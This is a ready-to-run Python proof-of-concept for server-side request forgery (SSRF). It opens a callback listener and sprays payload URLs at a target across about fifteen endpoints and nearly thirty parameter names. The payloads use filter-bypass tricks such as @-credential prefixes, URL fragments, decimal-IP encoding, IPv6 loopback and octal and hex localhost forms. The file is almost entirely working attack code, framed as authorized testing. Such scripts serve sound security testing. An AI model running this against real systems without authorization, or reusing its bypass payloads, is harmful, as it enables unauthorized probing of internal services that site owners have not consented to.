#!/usr/bin/env python3
"""
PoC: Server-Side Request Forgery (SSRF) - CVE-GENERIC-SSRF-001

Vulnerability: Server-side request forgery through unvalidated user-supplied
URLs in parameters that trigger server-side HTTP requests. The server can be
tricked into making requests to arbitrary internal or external destinations.

This script starts a lightweight HTTP listener on a random port, then injects
the listener URL through common SSRF-prone parameters. If the listener receives
a connection from the target server, SSRF is confirmed.

Usage (authorized testing only):
    python poc_ssrf_001.py --target http://localhost:8080 --timeout 10

Exit codes:
    0 - CONFIRMED: vulnerability reproduced (listener received connection)
    1 - NOT_REPRODUCED: target does not appear vulnerable
    2 - ERROR: script encountered an error during execution

IMPORTANT: Only use against systems you have explicit written authorization
to test. Unauthorized access to computer systems is illegal.
"""

import argparse
import hashlib
import http.server
import os
import socket
import sys
import threading
import time

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("[ERROR] SSRF-001: 'requests' library is required. Install with: pip install requests")
    sys.exit(2)

VULN_ID = "SSRF-001"


def find_free_port():
    """Find a free TCP port on localhost."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("", 0))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return s.getsockname()[1]


def get_local_ip():
    """Get the local IP address that should be reachable from the target."""
    try:
        # Connect to a public address to determine our outbound interface
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except OSError:
        return "127.0.0.1"


class SSRFListenerHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler that records incoming connections for SSRF detection."""

    # Class-level storage shared across requests
    received_connections = []
    expected_marker = None
    lock = threading.Lock()

    def do_GET(self):
        """Handle GET requests from SSRF target."""
        with self.lock:
            self.received_connections.append({
                "method": "GET",
                "path": self.path,
                "client_address": self.client_address,
                "headers": dict(self.headers),
                "timestamp": time.time(),
            })
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        response = f"SSRF-MARKER-{self.expected_marker or 'NONE'}"
        self.wfile.write(response.encode())

    def do_POST(self):
        """Handle POST requests from SSRF target."""
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length > 0 else b""
        with self.lock:
            self.received_connections.append({
                "method": "POST",
                "path": self.path,
                "client_address": self.client_address,
                "headers": dict(self.headers),
                "body": body.decode("utf-8", errors="replace")[:1000],
                "timestamp": time.time(),
            })
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def do_HEAD(self):
        """Handle HEAD requests from SSRF target."""
        with self.lock:
            self.received_connections.append({
                "method": "HEAD",
                "path": self.path,
                "client_address": self.client_address,
                "headers": dict(self.headers),
                "timestamp": time.time(),
            })
        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        """Suppress default HTTP server logging."""
        pass


def start_listener(port, marker):
    """Start the SSRF listener on the given port."""
    SSRFListenerHandler.received_connections = []
    SSRFListenerHandler.expected_marker = marker

    server = http.server.HTTPServer(("0.0.0.0", port), SSRFListenerHandler)
    server.timeout = 1

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, thread


def generate_marker():
    """Generate a unique marker for this SSRF test run."""
    raw = f"ssrf-{os.getpid()}-{time.time()}-{os.urandom(8).hex()}"
    return hashlib.sha256(raw.encode()).hexdigest()[:12]


def build_ssrf_payloads(listener_url, marker):
    """
    Build SSRF payload URLs targeting the listener.
    Includes various URL formats and bypass techniques.
    """
    payloads = []

    # Direct URL
    payloads.append({
        "name": "direct_url",
        "url": f"{listener_url}/ssrf-check?marker={marker}",
    })

    # With @ credential bypass (http://attacker.com@expected-host)
    payloads.append({
        "name": "credential_bypass",
        "url": f"{listener_url.replace('http://', 'http://trusted.example.com@')}/ssrf?m={marker}",
    })

    # With fragment bypass
    payloads.append({
        "name": "fragment_bypass",
        "url": f"{listener_url}/ssrf?m={marker}#expected.example.com",
    })

    # Decimal IP encoding
    parts = listener_url.split("//")[1].split(":")
    if parts[0] not in ("localhost", "127.0.0.1"):
        ip_parts = parts[0].split(".")
        if len(ip_parts) == 4:
            decimal_ip = int(ip_parts[0]) * 16777216 + int(ip_parts[1]) * 65536 + int(ip_parts[2]) * 256 + int(ip_parts[3])
            port_str = parts[1].split("/")[0] if len(parts) > 1 else "80"
            payloads.append({
                "name": "decimal_ip",
                "url": f"http://{decimal_ip}:{port_str}/ssrf?m={marker}",
            })

    # IPv6 loopback (if listener is on localhost)
    port_from_url = listener_url.split(":")[-1].rstrip("/")
    payloads.append({
        "name": "ipv6_loopback",
        "url": f"http://[::1]:{port_from_url}/ssrf?m={marker}",
    })

    # Localhost alternative representations
    for alt_host in ["127.0.0.1", "localhost", "0.0.0.0", "127.1", "0177.0.0.1", "0x7f000001"]:
        payloads.append({
            "name": f"alt_host_{alt_host}",
            "url": f"http://{alt_host}:{port_from_url}/ssrf?m={marker}",
        })

    return payloads


# Common SSRF-vulnerable parameter names
SSRF_PARAM_NAMES = [
    "url", "uri", "link", "href", "src", "source",
    "redirect", "redirect_url", "return_url", "callback",
    "dest", "destination", "target", "next", "site",
    "feed", "fetch", "proxy", "webhook", "endpoint",
    "image", "image_url", "img", "icon_url", "avatar_url",
    "api_url", "host", "domain",
]

# Common SSRF-vulnerable endpoint paths
SSRF_ENDPOINTS = [
    ("GET", "/"),
    ("GET", "/api/fetch"),
    ("GET", "/api/proxy"),
    ("GET", "/api/webhook"),
    ("GET", "/proxy"),
    ("GET", "/fetch"),
    ("GET", "/redirect"),
    ("GET", "/preview"),
    ("GET", "/render"),
    ("GET", "/image"),
    ("POST", "/api/fetch"),
    ("POST", "/api/proxy"),
    ("POST", "/api/webhook"),
    ("POST", "/api/import"),
    ("POST", "/webhook"),
]


def send_ssrf_payload(session, target, method, endpoint, param_name, payload_url, timeout):
    """Send a single SSRF payload to the target."""
    url = target.rstrip("/") + endpoint

    try:
        if method == "GET":
            session.get(
                url,
                params={param_name: payload_url},
                timeout=timeout,
                allow_redirects=False,
            )
        else:
            # Try form-encoded
            session.post(
                url,
                data={param_name: payload_url},
                timeout=timeout,
                allow_redirects=False,
            )
            # Also try JSON
            session.post(
                url,
                json={param_name: payload_url},
                timeout=timeout,
                allow_redirects=False,
            )
    except RequestException:
        pass


def check_listener_connections(marker):
    """Check if the listener received any connections."""
    with SSRFListenerHandler.lock:
        connections = list(SSRFListenerHandler.received_connections)

    # Filter for connections that contain our marker
    marker_connections = [
        c for c in connections
        if marker in c.get("path", "")
        or marker in c.get("body", "")
    ]

    return connections, marker_connections


def run_exploit(target, timeout):
    """
    Execute the SSRF PoC against the target.

    Returns:
        tuple: (exit_code, results_dict)
    """
    marker = generate_marker()
    port = find_free_port()
    local_ip = get_local_ip()

    results = {
        "vuln_id": VULN_ID,
        "target": target,
        "marker": marker,
        "listener_port": port,
        "listener_ip": local_ip,
        "status": "NOT_REPRODUCED",
        "confirmed_vectors": [],
        "partial_indicators": [],
        "total_requests": 0,
        "errors": [],
    }

    session = requests.Session()
    session.headers.update({
        "User-Agent": "VulnAnalysis-PoC/1.0 (Authorized Security Testing)",
    })

    # Verify target is reachable
    try:
        probe = session.get(target, timeout=timeout)
        print(f"[*] {VULN_ID}: Target reachable (HTTP {probe.status_code})")
    except RequestException as e:
        results["status"] = "ERROR"
        results["errors"].append(f"Target unreachable: {e}")
        return 2, results

    # Start the SSRF listener
    print(f"[*] {VULN_ID}: Starting SSRF listener on {local_ip}:{port}")
    try:
        server, server_thread = start_listener(port, marker)
    except OSError as e:
        results["status"] = "ERROR"
        results["errors"].append(f"Failed to start listener: {e}")
        return 2, results

    print(f"[*] {VULN_ID}: Listener started, marker: {marker}")

    listener_url = f"http://{local_ip}:{port}"

    # Build SSRF payloads
    ssrf_payloads = build_ssrf_payloads(listener_url, marker)

    total_combos = len(SSRF_ENDPOINTS) * len(SSRF_PARAM_NAMES) * len(ssrf_payloads)
    print(f"[*] {VULN_ID}: Sending {total_combos} SSRF payloads...")

    # Send all payloads
    for method, endpoint in SSRF_ENDPOINTS:
        for param_name in SSRF_PARAM_NAMES:
            for payload in ssrf_payloads:
                results["total_requests"] += 1
                send_ssrf_payload(
                    session, target, method, endpoint,
                    param_name, payload["url"], timeout,
                )

    # Wait for potential callbacks
    wait_time = min(timeout, 10)
    print(f"[*] {VULN_ID}: Waiting {wait_time}s for callbacks...")
    time.sleep(wait_time)

    # Check what connections the listener received
    all_connections, marker_connections = check_listener_connections(marker)

    # Shut down the listener
    server.shutdown()

    if marker_connections:
        results["status"] = "CONFIRMED"
        for conn in marker_connections:
            results["confirmed_vectors"].append({
                "client_address": conn["client_address"],
                "method": conn["method"],
                "path": conn["path"],
                "headers": conn.get("headers", {}),
                "timestamp": conn["timestamp"],
            })
        return 0, results

    if all_connections:
        # Received connections but without our marker -- could be SSRF
        # but also could be health checks, etc.
        results["status"] = "PARTIAL"
        results["partial_indicators"].append({
            "type": "unmarked_connections",
            "detail": f"Listener received {len(all_connections)} connection(s) without the expected marker",
            "connections": [
                {
                    "client": c["client_address"],
                    "method": c["method"],
                    "path": c["path"],
                }
                for c in all_connections
            ],
        })
        return 1, results

    print(f"[-] {VULN_ID}: No connections received by listener after {results['total_requests']} requests")
    return 1, results


def main():
    parser = argparse.ArgumentParser(
        description=f"PoC for Server-Side Request Forgery vulnerability ({VULN_ID})",
        epilog="For authorized security testing only.",
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8080",
        help="Target base URL (default: http://localhost:8080)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Request timeout in seconds (default: 30)",
    )
    args = parser.parse_args()

    target = args.target.rstrip("/")
    if not target.startswith(("http://", "https://")):
        print(f"[ERROR] {VULN_ID}: Target must start with http:// or https://")
        sys.exit(2)

    print(f"[*] {VULN_ID}: Server-Side Request Forgery PoC")
    print(f"[*] {VULN_ID}: Target: {target}")
    print(f"[*] {VULN_ID}: Timeout: {args.timeout}s")
    print(f"[*] {'=' * 60}")

    try:
        exit_code, results = run_exploit(target, args.timeout)
    except KeyboardInterrupt:
        print(f"\n[!] {VULN_ID}: Interrupted by user")
        sys.exit(2)
    except Exception as e:
        print(f"[ERROR] {VULN_ID}: Unhandled exception: {e}")
        sys.exit(2)

    print(f"[*] {'=' * 60}")
    status = results["status"]
    if status == "CONFIRMED":
        print(f"[CONFIRMED] {VULN_ID}: SSRF vulnerability confirmed")
        print(f"    Connections received: {len(results['confirmed_vectors'])}")
        for vec in results["confirmed_vectors"]:
            print(f"      - {vec['method']} from {vec['client_address']} to {vec['path']}")
    elif status == "PARTIAL":
        print(f"[PARTIAL] {VULN_ID}: Partial SSRF indicators found, manual review needed")
        for ind in results["partial_indicators"]:
            print(f"    {ind['detail']}")
    elif status == "ERROR":
        print(f"[ERROR] {VULN_ID}: {'; '.join(results['errors'])}")
    else:
        print(f"[NOT_REPRODUCED] {VULN_ID}: SSRF not reproduced")

    sys.exit(exit_code)


if __name__ == "__main__":
    main()
